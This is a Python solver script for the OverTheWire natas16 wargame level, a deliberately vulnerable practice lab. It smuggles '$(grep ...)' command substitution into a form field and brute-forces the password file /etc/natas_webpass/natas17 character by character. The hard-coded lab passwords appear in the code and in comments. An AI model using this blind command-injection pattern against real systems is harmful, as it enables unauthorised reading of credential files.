import requests
import re
import string

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
# print(characters)

username ='natas16'
password ='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
# responce = session.post(url,data = {"needle":'anythings$(grep b /etc/natas_webpass/natas17)'}, auth = (username,password))
seenpass = list()
while(len(seenpass)<32):
    for ch in characters:
        # print("trying character =","".join(seenpass)+ch)
        responce = session.post(url,data = {"needle":'anythings$(grep ^'+"".join(seenpass)+ch+ ' /etc/natas_webpass/natas17)'}, auth = (username,password))
        content = responce.text 
        returned = (re.findall('<pre>\n(.*)\n</pre>',content))
        # print (content)
        if returned:
            print("error in =","".join(seenpass)+ch)
        else:
            print("FOUND CHARACTER =","".join(seenpass)+ch)
            seenpass.append(ch)
            break
print("password for natas 18 is = ","".join(seenpass))

# print("password for natas 18 is = 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")